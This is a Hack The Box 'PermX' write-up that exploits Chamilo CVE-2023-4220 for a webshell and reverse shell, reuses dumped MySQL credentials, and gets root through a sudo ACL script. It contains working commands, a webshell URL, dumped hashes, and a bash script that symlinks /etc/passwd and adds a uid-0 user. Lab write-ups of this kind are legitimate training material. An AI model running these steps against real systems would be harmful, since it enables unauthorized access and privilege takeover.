---
title: HTB-PermX
draft: false
tags:
  - htb
  - linux
  - easy
  - ffuf
  - subdomain-bruteforce
  - chamilo
  - mysql
  - sudoers
  - bcrypt
  - acl
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/PermX.png)

## Rustscan

Rustscan find SSH and HTTP running:

`rustscan --addresses permx.htb --range 1-65535`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-1.png)

## Enumeration
### HTTP - TCP 80

There's nothing special about `permx.htb`. Several forms are there, but not exploitable:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image.png)

Feroxbuster discovers bunch of new directories but none of them seem very interesting:

`feroxbuster -u http://permx.htb`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-2.png)

Potential username is discovered. Let's see if this will come handy later:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-3.png)

Enumerating the subdomain using `ffuf`, `www.permx.htb` and `lms.permx.htb` are found:

`ffuf -u http://10.10.11.23 -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.permx.htb' -fw 18`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-4.png)

Let's edit `/etc/hosts` to add the above.

### lms.permx.htb

`lms.permx.htb` is running Chamilo 1.0 login page:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-5.png)

On the bottom right side of the page, admin name is shown:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-6.png)

## Exploitation

Googling for Chamilo 1.0 exploit, it seems like I can attempt on RCE:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-7.png)

### CVE-2023-4220

Let's first the exploit git repository from [here](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc).

`git clone https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-8.png)

After everything is setup properly, scan to check the vulnerability. Exploit confirms the vulnerability:

`sudo python3 main.py -u http://lms.permx.htb -a scan`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-9.png)

There are two options.

First, I can spawn a webshell as such:

`sudo python3 main.py -u http://lms.permx.htb -a webshell`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-11.png)

I can send in commands through the webshell like below:

`http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/webshell.php?cmd=whoami`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-10.png)

I can spawn a reverse shell as well:

`sudo python3 main.py -u http://lms.permx.htb -a revshell`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-12.png)

After inputting correct IP address and listening port, we get a shell as `www-data`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-13.png)

## Privesc: www-data to mtz

It seems like `user.txt` is inside `mtz` user folder so we have to go escalate our privilege:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-14.png)

### Chamilo Conf

Looking into `/var/www/chamilo/app/config/configuration.php`, credentials for MySQL is revealed:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-15.png)

MySQL is running on port 3306 locally:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-16.png)

### MySQL

Let's list databases:

`mysql -u chamilo -p03F6lY3uXAP2bkW8 -e "SHOW DATABASES;"`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-17.png)

Since `chamilo` database seems interesting, I will list tables in it:

`mysql -u chamilo -p03F6lY3uXAP2bkW8 -e "SHOW TABLES;" chamilo`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-18.png)

Dumping `user` table information, I get password hashes:

`mysql -u chamilo -p03F6lY3uXAP2bkW8 -e "SELECT * FROM user;" chamilo`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-19.png)

| username | username_canonical | email                  | password                                                               | salt                                |
|----------|--------------------|------------------------|------------------------------------------------------------------------|--------------------------------------|
| admin    | admin              | admin@permx.htb        | $2y$04$1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra           | awb0kMoTumbFvi22ojwv.Pg92gFTMOt837kWsGVbJN4 |
| anon     | anon               | anonymous@example.com  | $2y$04$wyjp2UVTeiD/jF4OdoYDquf4e7OWi6a3sohKRDe80IHAyihX0ujdS           | Mr1pyTT.C/oEIPb/7ezOdrCDKM.KHb0nrXAUyIyt/MY |

Before cracking bcrypt hash, I will remove any leading or trailing whitespace:

`sed -i 's/^[ \t]*//;s/[ \t]*$//' hash`

I tried cracking the hash, but it failed using rockyou.txt:

`hashcat -m 3200 hash ~/Downloads/rockyou.txt`

Turns out there was no need to crack the password and user `mtz`was using the password for the MySQL login. I can ssh in as user `mtz`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-20.png)

## Privesc: mtz to root
### sudoers

Running `sudo -l`, `/opt/acl.sh` could be ran as `sudo` without needing any password:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-21.png)

Let's take a look at `acl.sh`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-22.png)

`/opt/acl.sh`, is designed to modify the access control list (ACL) of a specified file using the `setfacl` command. ACLs allow you to set more granular file permissions than the standard Unix file permissions.

Below script performs several actions, primarily aimed at exploiting the ACL modification to gain unauthorized access by adding a new user with root privileges:

```bash
#!/bin/bash

# Create the soft link in home directory (passes both checks)
ln -sf /etc/passwd /home/mtz/passwd

# Run the script to allow read & write to the /etc/passwd
sudo /opt/acl.sh mtz rw /home/mtz/passwd

# Add a new user with the id of 0 (the password is: 123)
echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd

# Remove the link
rm /home/mtz/passwd

# Log in ass the new user
su new
```

Running the script, we get a shell as the new root user and we can read `root.txt`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-23.png)


## References
- https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc